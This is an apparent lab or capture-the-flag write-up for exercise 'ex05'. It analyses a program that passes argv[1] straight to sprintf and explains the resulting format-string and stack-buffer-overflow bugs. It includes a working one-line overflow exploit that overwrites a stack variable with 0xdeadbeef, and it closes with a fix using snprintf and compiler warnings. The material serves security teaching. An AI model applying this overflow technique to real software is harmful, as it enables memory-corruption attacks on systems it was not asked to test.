# ex05 — `sprintf(dst, argv[1])` used as bounded copy

Goal: `you have hit the target correctly :)`

## Assembly

```
main:
    mov    eax, [argv+4]       ; argv[1]
    push   eax
    call   vuln

vuln:
    sub    esp, 0x68
    mov    [ebp-0xc], 0        ; target = 0
    mov    eax, [ebp+8]        ; argv[1]
    mov    [esp+4], eax
    lea    eax, [ebp-0x4c]     ; &buffer
    call   sprintf              ; sprintf(buffer, argv[1])   VULN
    mov    eax, [ebp-0xc]
    cmp    eax, 0xdeadbeef
    jne    .lose
    puts("you have hit the target correctly :)")
```

Two bugs stacked in one call:

1. `sprintf` uses `argv[1]` as the **format string** — classic format-string
   vulnerability (any `%s`/`%n` in the input would be honored).
2. Even without format specifiers, `sprintf` has no bound on the destination —
   plain overflow works.

## Stack layout

```
+---------------+ ebp        saved ebp
+---------------+ ebp-0x0c   target      (must be 0xdeadbeef)
| buffer[64]    | ebp-0x4c   (dst of sprintf)
+---------------+
```

Distance buffer → target: `0x4c - 0x0c = 64`.

`argv[1]` cannot contain NUL, so with 68 bytes of payload (`A×64` + 4 target
bytes) `sprintf` copies all 68, and writes the final `NUL` at buffer[68]
(= `ebp-0x08`), which is past `target` and harmless.

## Exploit

```bash
./ex05/bin "$(python3 -c "import sys; sys.stdout.buffer.write(b'A'*64 + b'\xef\xbe\xad\xde')")"
```

Output: `you have hit the target correctly :)`

## Fix

`sprintf(dst, src)` where `src` is untrusted is doubly wrong.
- Use `snprintf(dst, sizeof dst, "%s", src)` — bounded **and** treats input as data.
- Enable `-Wformat -Wformat-security` in the compiler so the pattern is flagged.
